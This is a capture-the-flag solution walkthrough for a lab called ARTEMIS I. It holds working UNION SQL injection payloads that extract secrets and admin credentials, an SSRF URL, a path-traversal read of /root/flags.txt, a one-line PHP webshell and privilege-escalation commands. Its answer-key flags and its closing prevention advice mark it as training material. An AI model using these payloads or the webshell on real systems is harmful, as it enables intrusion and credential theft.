# ARTEMIS I - Complete Solution Walkthrough

## Overview

ARTEMIS I is a multi-stage CTF challenge requiring SQL injection, SSRF, and privilege escalation to capture all 4 flags.

---

## Flag 1: Public API Key (100 points)

### Location
Visible on the main dashboard at `http://target/`

### Steps
1. Access the main page
2. Scroll down to find the "Public API Key" section
3. The flag is displayed directly: `XACK{f3d4b2a1c9e8d7f6a5b4c3d2e1f0a9b8}`

**Difficulty**: Trivial - No exploitation required

---

## Flag 2: User Token (200 points)

### Vulnerability
SQL Injection in the search functionality (`search.php`)

### Exploitation Steps

#### 1. Identify SQL Injection
```
URL: http://target/search.php?q=test
```

The search parameter is vulnerable to SQL injection.

#### 2. Determine Number of Columns
```sql
' UNION SELECT 1,2,3,4,5,6 --
```

The query has 6 columns.

#### 3. Extract Database Information
```sql
' UNION SELECT 1,database(),user(),4,5,6 --
```

Result: `artemis_monitoring`, `artemis@localhost`

#### 4. Enumerate Tables
```sql
' UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema='artemis_monitoring' --
```

Tables found:
- sensors
- users
- system_logs
- **secrets** ← Target table

#### 5. Extract Secrets
```sql
' UNION SELECT 1,key_name,key_value,access_level,5,6 FROM secrets --
```

Result:
- Public: `XACK{f3d4b2a1c9e8d7f6a5b4c3d2e1f0a9b8}`
- **User: `XACK{a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4}`** ✅
- Admin: `XACK{c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0}`
- Root: `XACK{e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6}`

**Flag 2**: `XACK{a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4}`

---

## Flag 3: Admin Secret (300 points)

### Challenge
Access the internal admin panel running on `localhost:8080`

### Vulnerability
Server-Side Request Forgery (SSRF) or Port Forwarding

### Method 1: SSRF via PHP (if available)

If there's a file inclusion or SSRF vulnerability, access:
```
http://localhost:8080/
```

### Method 2: Extract Admin Credentials via SQL Injection

#### 1. Get Admin Credentials
```sql
' UNION SELECT 1,username,password,email,role,6 FROM users WHERE role='admin' --
```

Result:
- Username: `admin`
- Password (MD5): `0192023a7bbd73250516f069df18b500`
- Cracked: `admin123`

#### 2. Access Admin Panel

Since the admin panel is on `localhost:8080`, you need to:

**Option A**: Use curl from within the container (if you have RCE)
```bash
curl http://localhost:8080/login.php
```

**Option B**: SSH tunnel (if SSH is available)
```bash
ssh -L 8080:localhost:8080 user@target
```

**Option C**: SSRF payload (if vulnerable endpoint exists)
```
http://target/proxy.php?url=http://localhost:8080/
```

#### 3. Login to Admin Panel
- Navigate to `http://localhost:8080/login.php`
- Username: `admin`
- Password: `admin123`

#### 4. Capture Flag
The admin panel displays: **`XACK{c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0}`** ✅

---

## Flag 4: Root Master Key (400 points)

### Location
`/root/flags.txt` on the file system

### Challenge
Requires Remote Code Execution (RCE) or Local File Inclusion (LFI)

### Potential Attack Vectors

#### Method 1: Command Injection
Look for vulnerable parameters that execute system commands.

#### Method 2: File Upload
If there's a file upload functionality, upload a PHP webshell:

```php
<?php system($_GET['cmd']); ?>
```

Then execute:
```
http://target/uploads/shell.php?cmd=cat /root/flags.txt
```

#### Method 3: Local File Inclusion
If LFI exists:
```
http://target/page.php?file=../../../../root/flags.txt
```

#### Method 4: SQL Injection with LOAD_FILE
```sql
' UNION SELECT 1,LOAD_FILE('/root/flags.txt'),3,4,5,6 --
```

Note: This requires MySQL `FILE` privilege.

#### Method 5: Privilege Escalation
If you gain shell access as `www-data`:

1. Check sudo permissions:
```bash
sudo -l
```

2. Look for SUID binaries:
```bash
find / -perm -4000 2>/dev/null
```

3. Exploit misconfigured services or cron jobs

4. Read the flag:
```bash
sudo cat /root/flags.txt
# or
cat /root/flags.txt  # if you escalated to root
```

**Flag 4**: `XACK{e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6}`

---

## Summary

### Flags Captured
1. ✅ Public: `XACK{f3d4b2a1c9e8d7f6a5b4c3d2e1f0a9b8}` (100 pts)
2. ✅ User: `XACK{a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4}` (200 pts)
3. ✅ Admin: `XACK{c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0}` (300 pts)
4. ✅ Root: `XACK{e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6}` (400 pts)

**Total Points**: 1000

### Techniques Used
- Information Gathering
- SQL Injection (UNION-based)
- Database Enumeration
- Credential Extraction
- SSRF / Port Forwarding
- Remote Code Execution
- Privilege Escalation

### Key Learnings
1. Always test user input for SQL injection
2. Internal services can be accessed via SSRF
3. Firewall rules don't protect against localhost access
4. Chaining vulnerabilities leads to full system compromise
5. Defense in depth is crucial for security

---

## Prevention

### SQL Injection
```php
// Use prepared statements
$stmt = $conn->prepare("SELECT * FROM sensors WHERE sensor_name LIKE ?");
$search_param = "%$search%";
$stmt->bind_param("s", $search_param);
```

### SSRF Protection
- Validate and whitelist URLs
- Block access to internal IP ranges (127.0.0.1, 10.0.0.0/8, etc.)
- Use separate networks for internal services

### Firewall Configuration
- Implement application-level authentication
- Don't rely solely on network-level restrictions
- Use VPNs for admin access

### Privilege Escalation
- Follow principle of least privilege
- Regular security audits
- Keep systems updated
- Disable unnecessary SUID binaries
